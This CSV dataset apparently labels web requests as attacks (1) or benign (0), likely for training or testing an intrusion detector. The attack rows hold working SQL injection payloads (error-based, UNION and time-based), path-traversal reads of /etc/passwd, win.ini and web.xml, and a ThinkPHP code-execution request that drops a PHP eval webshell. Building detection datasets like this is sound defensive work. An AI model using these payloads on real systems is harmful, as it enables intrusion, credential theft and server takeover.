request_url,status
depNO=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'1122'='1122,1
FileUrl=c:%5Cwindows%5Cwin.ini,1
FileFullPath=%5Cetc%5Cpasswd&FileName=passwd,1
item_ID=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'1122'='1122,1
"keywords=1122'/**/and/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x7c,0x6366726565723A693A6A78,0x7c,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)/**/and/**/'1'='1",1
"DataId=1&Code=2%27and/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x7c,0x6366726565723A693A6A78,0x7c,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23",1
searchContext=-1%25%27%20UNION%20%20ALL%20SELECT%20%20NULL%2CNULL%2CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%2898%29%7C%7CCHR%28115%29%7C%7CCHR%2899%29%7C%7CCHR%2897%29%7C%7CCHR%28110%29%7C%7CCHR%2858%29%7C%7CCHR%28105%29%7C%7CCHR%2858%29%7C%7CCHR%28102%29%7C%7CCHR%28105%29%7C%7CCHR%28110%29%7C%7CCHR%28100%29%2CNULL%20FROM%20DUAL%20--,1
FileFullPath=c:%5Cwindows%5Cwin.ini&FileName=win.ini,1
loginname=admin'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'FrOd'='FrOd,1
depNO=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'1122'='1122,1
itemtype=12%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(99)%7C%7CCHR(102)%7C%7CCHR(114)%7C%7CCHR(101)%7C%7CCHR(101)%7C%7CCHR(114)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(106)%7C%7CCHR(120)%7C%7CCHR(58)%7C%7CCHR(62)))%20FROM%20DUAL)&depNO=jx&approveName=&nowPage=3,1
status=showpage&LanguageType=1%27%20UNION%20ALL%20SELECT%20NULL%2Cchar%28119%29%2bchar%28101%29%2bchar%2898%29%2bchar%28115%29%2bchar%2899%29%2bchar%2897%29%2bchar%28110%29%2bchar%2858%29%2bchar%28105%29%2bchar%2859%29%2bchar%28102%29%2bchar%28105%29%2bchar%28110%29%2bchar%28100%29%2CNULL%2CNULL--%20,1
more=1&columnNameValue=2%27%20UNION%20ALL%20SELECT%20chr%28119%29%7C%7Cchr%28101%29%7C%7Cchr%2898%29%7C%7Cchr%28115%29%7C%7Cchr%2899%29%7C%7Cchr%2897%29%7C%7Cchr%28110%29%7C%7Cchr%2858%29%7C%7Cchr%28105%29%7C%7Cchr%2858%29%7C%7Cchr%28102%29%7C%7Cchr%28105%29%7C%7Cchr%28110%29%7C%7Cchr%28100%29%2CNULL%2CNULL%20FROM%20DUAL--&moreZongQi=021,1
FileUrl=%5Cetc%5Cpasswd,1
username=123%27%2f%2a%2a%2fand%2f%2a%2a%2f%28seleselectct%2f%2a%2a%2f1%2f%2a%2a%2ffrom%2f%2a%2a%2f%28selselectect%2f%2a%2a%2fcount%28%2a%29%2Cconcat%280x7c%2C0x7765627363616E3A693A66696E64%2C0x7c%2Cfloor%28rand%280%29%2a2%29%29x%2f%2a%2a%2ffrom%2f%2a%2a%2finformation_schema.tables%2f%2a%2a%2fgroup%2f%2a%2a%2fby%2f%2a%2a%2fx%29a%29%23,1
"flag=flag&NewsId=-12'%20union%20all%20select%20CHAR%2884%29%2bCHAR%2897%29%2bCHAR%28105%29%2bCHAR%2887%29%2bCHAR%2897%29%2bCHAR%28110%29%2bCHAR%2858%29%2bCHAR%28103%29%2bCHAR%28111%29%2bCHAR%2858%29%2bCHAR%28104%29%2bCHAR%28111%29%2bCHAR%28109%29%2bCHAR%28101%29,12,12,12,12,12,12,12,12--",1
more=1&columnNameValue=2%27%20UNION%20ALL%20SELECT%20chr%28119%29%7C%7Cchr%28101%29%7C%7Cchr%2898%29%7C%7Cchr%28115%29%7C%7Cchr%2899%29%7C%7Cchr%2897%29%7C%7Cchr%28110%29%7C%7Cchr%2858%29%7C%7Cchr%28105%29%7C%7Cchr%2858%29%7C%7Cchr%28102%29%7C%7Cchr%28105%29%7C%7Cchr%28110%29%7C%7Cchr%28100%29%2CNULL%2CNULL%20FROM%20DUAL--&moreZongQi=021,1
searchContext=-1%25%27%20UNION%20%20ALL%20SELECT%20%20NULL%2CNULL%2CCHR%28119%29%7C%7CCHR%28101%29%7C%7CCHR%2898%29%7C%7CCHR%28115%29%7C%7CCHR%2899%29%7C%7CCHR%2897%29%7C%7CCHR%28110%29%7C%7CCHR%2858%29%7C%7CCHR%28105%29%7C%7CCHR%2858%29%7C%7CCHR%28102%29%7C%7CCHR%28105%29%7C%7CCHR%28110%29%7C%7CCHR%28100%29%2CNULL%20FROM%20DUAL%20--,1
infotype=-1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(107)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(57)%7C%7CCHR(57)%7C%7CCHR(55)))%20FROM%20DUAL)%20and%20'at'='at,1
ColumnCode=-12'%20union%20all%20select%20CHR(119)%7C%7CCHR(101)%7C%7CCHR(98)%7C%7CCHR(115)%7C%7CCHR(99)%7C%7CCHR(97)%7C%7CCHR(110)%7C%7CCHR(58)%7C%7CCHR(105)%7C%7CCHR(58)%7C%7CCHR(102)%7C%7CCHR(105)%7C%7CCHR(110)%7C%7CCHR(100)%20from%20DUAL%20--,1
RecordID=-2074%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C%28SELECT%20CONCAT%280x717765727479%2C0x3A746573743A%2C0x7168726371%29%20FROM%20ezoffice.org_employee%20LIMIT%2021%2C1%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&Template=0&FileType=.doc&EditType=1&UserName=1&moduleType=1&saveHtmlImage=1&saveDocFile=1,1
objfile=/etc/passwd,1
inputFile=/etc/passwd,1
errorName=/../../../../was/webroot/WEB-INF/web.xml,1
xwl=13O1AVUENBSF&dir=@../../WEB-INF/web.xml,1
locale=../../../../custommenu.xml%00en,1
spell=1%25%27%20UNION%20SELECT%20CHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%2858%29%7C%7CCHR%2899%29%7C%7CCHR%2899%29%2Cnull%20FROM%20DUAL%20--,1
picFile=../../../../../../../../conf/resin.conf,1
user_ids=(1)%20UNION%20ALL%20SELECT%200x43453B443A4152%23,1
pk_infotype=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(109)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(97)%7C%7CCHR(97)%7C%7CCHR(55)))%20FROM%20DUAL)%20AND%20'ohehe'='ohehe,1
method=txtDownload&destFile=/../../../../was/webroot/WEB-INF/web.xml,1
user&q=action/check_email&email=%27%20and%20%28select%201%20from%20%28select%20count%28%2a%29%2Cconcat%28md5%280x7765627363616e%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23,1
userid=1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(107)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(57)%7C%7CCHR(57)%7C%7CCHR(55)))%20FROM%20DUAL)%20AND%20'FrOd'='FrOd&pwd=1,1
xwl=13O1AVUENBSF&dir=@../../WEB-INF/web.xml,1
"LeadId=-1%20UNION%20ALL%20SELECT%20NULL,CHR(58)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(58)%7C%7CCHR(89)%7C%7CCHR(58)%7C%7CCHR(113)%7C%7CCHR(113)%7C%7CCHR(113)%7C%7CCHR(58),NULL,NULL,NULL,NULL%20FROM%20DUAL--%20&department_id=null&department_name=&department_no=1",1
m=Goods&a=showByUname&uname=%2527AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x7765627363616e%29%2CFLOOR%28RAND%280%29%2a2%29%29X%20FROM%20information_schema.tables%20GROUP%20BY%20X%29a%29%23,1
pk_message=-1'%20AND%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(117)%7C%7CCHR(117)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(98)%7C%7CCHR(98)%7C%7CCHR(57)%7C%7CCHR(55)))%20FROM%20DUAL)%20AND%20'ohe'='ohe,1
"type=info&type_id=3&id=-120'%20OR%20(SELECT%204774%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1122),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20'BLkR'='BLkR&type_id=3&re=0",1
locale=../../../../custommenu.xml%00en,1
userid=1/**/AND/**/1122=(SELECT/**/UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(107)%7C%7CCHR(58)%7C%7C(SELECT/**/(CASE/**/WHEN/**/(1122=1122)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(57)%7C%7CCHR(57)%7C%7CCHR(55)))/**/FROM/**/DUAL)%20--,1
filename=..%5CWEB-INF%5Cweb.xml,1
"DataId=1&Code=1%27and/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x7c,md5(0x234445),0x7c,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23",1
fax_ids=(1)%20UNION%20ALL%20SELECT%200x43453B443A4152%23,1
pkcorp=1'%20AND%204310=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(58)%7C%7CCHR(113)%7C%7CCHR(106)%7C%7CCHR(107)%7C%7CCHR(106)%7C%7CCHR(109)%7C%7C(SELECT%20(CASE%20WHEN%20(4310=4310)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(113)%7C%7CCHR(111)%7C%7CCHR(58)%7C%7CCHR(109)%7C%7CCHR(113)%7C%7CCHR(62)))%20FROM%20DUAL)%20AND%20'HdRC'='HdRC,1
path=c:/windows/win.ini,1
user_ids=(1)%20UNION%20ALL%20SELECT%200x43453B443A4152%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20MlzN,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20TAHV,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%filename=..\WEB-INF\web.xml%20UNION%20ALL%20SELECT%20NULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
"/faq.php?action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23",1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/voteapp/SuggestionShow.aspx?SuggestionID=75%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20QLIs,1
/user.php?act=login,1
/common.login.doregister.phtml?username=&family_name=&password2=&xieyi=&validatecode=&password=&mem_mphone=WEB-INF%2Fweb.xml%3F,1
/136.news.detail.phtml?news_id=file%3A%2F%2F%2Fetc%2Fpasswd,1
/common.login.login.dhtml?username=&loginsave=.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2Fetc%2Fpasswd&password=,1
/common.login.login.dhtml?username=.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2Fetc%2Fpasswd&loginsave=&password=,1
/187.news.list.phtml?page=WEB-INF%5Cweb.xml,1
/common.login.doregister.phtml?username=&family_name=&password2=&xieyi=&validatecode=&password=&mem_mphone=WEB-INF%2Fweb.xml,1
/common.login.doregister.phtml?username=&family_name=&password2=&xieyi=&validatecode=&password=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini&mem_mphone=,1
/common.login.doregister.dhtml?username=&family_name=&password2=&xieyi=&validatecode=&password=&mem_mphone=file%3A%2F%2F%2Fetc%2Fpasswd,1
/194.news.commentlist.phtml?news_id=.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2Fetc%2Fpasswd,1
/187.news.list.phtml?page=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini,1
"/index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=%3C?php%20fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='));?%3E",1
/eap/41.news.list?newstimeend=&newstitle=&page=&newstimestart=%29%20AND%201611%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281611%3D1611%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%285523%3D5523,1
/eap/41.news.list?newstimeend=&newstitle=%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29aONY%29&page=&newstimestart=,1
/,0
/images0/13.jpg,0
/images/wmxy.jpg,0
/images/xdjh.jpg,0
/zs.asp,0
/images0/263.jpg,0
/img/%E5%A4%87%E6%A1%88%E5%9B%BE%E6%A0%87.png,0
/img/bottomn.jpg,0
/xsgzc,0
/SmallClass.asp?typeid=38&BigClassID=137&smallclassid=165,0
/news1.asp?bigclassid=145&shu=8,0
/images0/262.jpg,0
/IMAGES/mlbh3.swf,0
/images/img1.jpg,0
/dbweb/index.asp,0
/xygk/xyjs.htm,0
/bigclassdeta.asp?typeid=38&bigclassid=191,0
/img/mlbh.gif,0
/zgw,0
/xygk/xyjj.htm,0
/images0/111.jpg,0
/js/jquery.banner.js,0
/images/xh.jpg,0
/js/sohuflash_1.js,0
/img/cyberhome.gif,0
/IMAGES/qq.png,0
/images0/32.jpg,0
/img/xyxw.gif,0
/js/jquery.js,0
/xxgk/,0
/IMAGES/zgzl.jpg,0
/img/topp6.swf,0
/images0/101.jpg,0
/news.asp?bigclassid=148&shu=6,0
/tw/,0
/jy.asp,0
/img/xygg.gif,0
/bigclassdeta.asp?typeid=38&bigclassid=171,0
/jw.asp,0
/tw/images/md_pic_frame02.gif,0
/tw/UPLOAD/2018052317030173499.jpg,0
/zhaosheng/images/2left2.gif,0
/jiaowu/css/templatemo_style.css,0
/xygk/images/tu94.gif,0
/dbweb/news.asp?id=903,0
/jiaowu/js/slides.min.jquery.js,0
/news.asp?smallclassid=179&shu=2,0
/ReadNews.asp?NewsID=6094,0
/SmallClass.asp?typeid=38&BigClassID=139&smallclassid=286,0
/xygk/images/tu126.jpg,0
/ReadNews.asp?NewsID=6096,0
/zhaosheng/jxlq/index.asp,0
/SmallClass.asp?typeid=38&BigClassID=139&smallclassid=289,0
/tw/links.asp,0
/ReadNews.asp?NewsID=1406,0
/zhaosheng/images/2left1.gif,0
/zhaosheng/images/tu005.gif,0
/SmallClass.asp?typeid=38&BigClassID=139&smallclassid=281,0
/xygk/images/tu87.gif,0
/xygk/images/d6.gif,0
/ReadNews.asp?NewsID=6075,0
/tw/images/yxyzbn.jpg,0
/SmallClass.asp?typeid=38&BigClassID=139&smallclassid=290,0
/dbweb/logolinks/pf.jpg,0
/bigclassdeta.asp?typeid=38&bigclassid=192,0
/xygk/images/tu38.jpg,0
/tw/images/in_06.jpg,0
/jiuye/images/t3.gif,0
/tw/news.asp?id=474,0
/zhaosheng/images/2dh6.gif,0
/zhaosheng/images/wsbm.gif,0
/zhaosheng/images/xuas.gif,0
/xygk/images/tu36.jpg,0
/tw/news.asp?id=450,0
/xygk/images/tu85.gif,0
/SmallClass.asp?typeid=38&BigClassID=139&smallclassid=215,0
/xzfw.asp,0
/dbweb/images/in_04.jpg,0
/SmallClass.asp?typeid=38&BigClassID=150&smallclassid=202,0
/xygk/jgsz.htm,0
/dbweb/logolinks/gxgxxzpt.gif,0
/bigclassdeta.asp?typeid=38&BigClassid=145&page=11,0
/xygk/images/tu116.JPG,0
/bigclassdeta.asp?typeid=38&BigClassid=171&page=5,0
/BigClass.asp?typeid=38&BigClassID=137,0
/xygk/images/tu19.jpg,0
/news.asp?smallclassid=170&shu=6,0
/xygk/images/tu25.gif,0
/tw/images/in_08.jpg,0
/xygk/images/tu135.jpg,0
/SmallClass.asp?typeid=38&BigClassID=141&smallclassid=229,0
/xygk/images/d4.gif,0
/ReadNews.asp?NewsID=6243,0
/ReadNews.asp?NewsID=6000,0
/xygk/images/022.gif,0
/zhaosheng/zy_18.asp,0
/zhaosheng/images/2n4.gif,0
/xygk/images/tu141.gif,0
/xygk/images/tu80.JPG,0
/news.asp?smallclassid=217&shu=6,0
/xygk/images/tu80.gif,0
/BigClass.asp?typeid=38&BigClassID=148,0
/jiuye/images/03.jpg,0
/tw/images/icon.jpg,0
/BigClass.asp?typeid=38&BigClassID=145,0
/tw/logolinks/volunteer.jpg,0
/jiaowu/css/jquery.ennui.contentslider.css,0
/xygk/images/tu38.gif,0
/SmallClass.asp?typeid=38&BigClassID=149&smallclassid=228,0
/xygk/images/tu23.jpg,0
/gh/index.asp,0
/xygk/images/tu94.jpg,0
/bigclassdeta.asp?typeid=38&bigclassid=190,0
/ReadNews.asp?NewsID=5924,0
/dbweb/images/icon.jpg,0
/xygk/images/tu134.gif,0
/xygk/images/tu119.gif,0
/SmallClass.asp?typeid=38&BigClassID=136&smallclassid=140,0
/bmjj.asp,0
/SmallClass.asp?typeid=38&BigClassID=136&smallclassid=141,0
/xygk/images/tu127.gif,0
/zhaosheng/images/xtiao.gif,0
/xygk/images/tu86.jpg,0
/SmallClass.asp?typeid=38&BigClassID=169&smallclassid=240,0
/jiuye/images/s_4.gif,0
/xygk/images/tu6.JPG,0
/xygk/images/tu6.gif,0
/SmallClass.asp?typeid=38&BigClassID=141&smallclassid=155,0
/news.asp?smallclassid=169&shu=6,0
/zhaosheng/images/2yq5.gif,0
/xygk/images/tu40.jpg,0
/SmallClass.asp?typeid=38&BigClassID=141&smallclassid=154,0
/bigclassdeta.asp?typeid=38&bigclassid=168,0
/xygk/images/tu93.jpg,0
/dbweb/images/left_01.gif,0
/img/type01.gif,0
/img/arrow02.gif,0
/xygk/images/tu22.jpg,0
/bigclassdeta.asp?typeid=38&bigclassid=169,0
/SmallClass.asp?typeid=38&BigClassID=139&smallclassid=177,0
/bigclassdeta.asp?typeid=38&bigclassid=152,0
/xygk/images/tu126.gif,0
/SmallClass.asp?typeid=38&BigClassID=139&smallclassid=178,0
/SmallClass.asp?typeid=38&BigClassID=139&smallclassid=179,0
/xygk/images/tu111.jpg,0
/zhaosheng/images/zy8.gif,0
/tw/images/in_01.jpg,0
/xxgk/css/flexslider.css,0
/dbweb/images/zgm.jpg,0
/xygk/images/tu109.gif,0
/img/top.swf,0
/xygk/images/tu5.JPG,0
/bigclassdeta.asp?typeid=38&bigclassid=189,0
/ReadNews.asp?NewsID=1990,0
/xygk/images/tu5.gif,0
/tw/UPLOAD/2018052317075673499.jpg,0
/xygk/images/tu87.jpg,0
/dbweb/images/notice.jpg,0
/xmgl.asp,0
/xygk/images/tu105.jpg,0
/SmallClass.asp?typeid=38&BigClassID=139&smallclassid=186,0
/xygk/images/d1.gif,0
/zhaosheng/zy_40.asp,0
/tw/logolinks/gxxiaoyuan.jpg,0
/ReadNews.asp?NewsID=5526,0
/SmallClass.asp?typeid=38&BigClassID=139&smallclassid=180,0
/zhaosheng/zy_4.asp,0
/news3.asp?smallclassid=177&shu=5,0
/xygk/images/tu99.gif,0
/dbweb/news.asp?id=842,0
/jiuye/images/s_3.gif,0
/jiuye/images/more.gif,0
/dbweb/news.asp?id=845,0
/xygk/images/tu21.jpg,0
/SmallClass.asp?typeid=38&BigClassID=137&smallclassid=189,0
/news.asp?smallclassid=163&shu=8,0
/IMAGES/IMG.gif,0
/zhaosheng/images/2yq3.gif,0
/xygk/images/tu19.gif,0
/dbweb/logolinks/3.gif,0
/ReadNews.asp?NewsID=3829,0
/zp/BUSINESS%20ENGLISH%20LISTENING/BUSINESS%20ENGLISH%20LISTENING%20.ppt,0
/zhaosheng/lyb/%E5%B9%BF%E8%A5%BF%E8%B4%B5%E6%B8%AF%E5%B8%82%E6%B8%AF%E5%8D%97%E5%8C%BA%E6%9C%A8%E6%A0%BC%E9%95%87%E5%B9%B3%E6%82%A6%E4%B9%A1%E8%8E%AB%E9%A9%AC%E5%B1%AF240%E5%8F%B7,0
/tw/news.asp?id=431,0
/SmallClass.asp?typeid=38&BigClassid=144&SmallClassid=181&page=4,0
/jiuye/ADMIN/%E5%B9%BF%E4%B8%9C%E7%9C%81%E6%B9%9B%E6%B1%9F%E5%B8%82%E5%BE%90%E9%97%BB%E5%8E%BF75407%E9%83%A8%E9%98%9F60%E5%88%86%E9%98%9F,0
/zp/wmdhj/20100110.PPT,0
/xygk/images/mf.jpg,0
/ReadNews.asp?NewsID=2961,0
/jpkc/zgctwh/jxsd.asp,0
/jpkc/lyfw/10.html,0
/jpkc/dzsw1/flash/b1.swf,0
/gh/szwyadmin/edit/UploadFile/2017112917252543.jpg,0
/jpkc/aspwlkc/zp/%E6%AC%A3%E9%91%AB%E7%89%B9%E8%89%B2%E4%BA%A7%E5%93%81%E9%94%80%E5%94%AE/xpCatalog_xpsmall_Desc.asp?action_key_order=small&shopxpbe_id=54&shopxpse_id=568,0
/zhaosheng/lyb/%E6%98%AD%E5%B9%B3%E5%8E%BF,0
/zhaosheng/lyb/index.asp?page=110,0
/Tabf/NoScript_ADList.aspx,0
/Tabf/Image/icon_01.gif,0
/Rental/,0
/BECommon/Image/Banner/20181219_014834s.jpg,0
/Tabf/Image/Default_SecondaryTitle_1.gif,0
/Tabf/Page/2009tabf/images/exam_01.jpg,0
/BECommon/Image/ActivityPhoto/40_20120614_030052110.jpg,0
/App_Themes/RentalTheme/Image/pageLeftButton_07.gif,0
/Tabf/Page/2009tabf/images/Directorsand_S.gif,0
/Tabf/Page/intro_Training/image/image_0.gif,0
/Rental/Default.aspx,0
/Rental/Page/doc/build_nt01_2017.pdf,0
/Simplified/Image/icon_02.gif,0
/Simplified/page/intro_Training/course_C.aspx,0
/BECommon/Image/ActivityPhoto/42_20120301_024727498.jpg,0
/Rental/Page/p7_brief.aspx,0
